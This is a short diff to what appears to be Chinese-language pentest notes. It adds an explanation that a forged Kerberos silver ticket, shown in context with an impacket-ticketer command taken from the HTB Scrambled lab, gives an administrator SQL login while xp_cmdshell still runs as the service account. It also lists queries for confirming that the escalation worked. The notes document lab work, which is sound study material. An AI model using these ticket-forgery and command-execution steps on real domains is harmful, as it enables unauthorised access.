@@ -296,6 +296,8 @@ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-
 ```
 来源：HTB-Scrambled——getPac 取 domain-sid，ticketer 以 sqlsvc 的 NTLM 给 MSSQLSvc 伪造 user-id 500（administrator）票据，后续 `impacket-mssqlclient -k -no-pass` 以管理员身份操作。
 
+**身份语义坑**：落地后 `EXEC xp_cmdshell 'whoami'` 返回 `scrm\sqlsvc` 而非 administrator——银票伪造的是**登录身份**（SQL 权限层面：`SELECT SYSTEM_USER` = `SCRM\administrator`、`IS_SRVROLEMEMBER('sysadmin')` = 1），进程仍以服务账号运行。判定利用是否成功看 SQL 层权限查询，**不要**因 whoami 是服务账号就误判失败。
+
 ### 5.4 NTLMv1 降级破解（破出即 NT hash，可直接 PTH）
 
 ```bash
